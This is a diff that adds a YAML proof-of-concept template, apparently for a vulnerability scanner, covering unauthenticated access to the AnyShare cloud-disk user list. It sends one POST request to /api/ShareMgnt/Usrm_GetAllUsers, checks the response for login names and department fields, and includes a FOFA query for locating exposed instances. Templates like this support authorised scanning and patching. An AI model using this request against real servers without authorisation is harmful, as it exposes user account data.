@@ -1,0 +1,16 @@
+id: poc-yaml-anyshare-usrm-getallusers-unauthorized-access
+info:
+  name: 爱数云盘 Usrm_GetAllUsers 未授权访问漏洞
+  severity: medium
+  tags:
+  - 未授权访问
+  finger: anyshare
+  fofa: app="AISHU-AnyShare"
+requests:
+- method: POST
+  path: /api/ShareMgnt/Usrm_GetAllUsers
+  data: '[1,10]'
+  expression: status_code == 200 && contains(body,"\"loginName\"") && contains(body,"\"directDeptInfo\"")
+    && contains(body,"\"departmentNames\"") && contains(content_type,"application/json")
+variables: {}
+transport: http
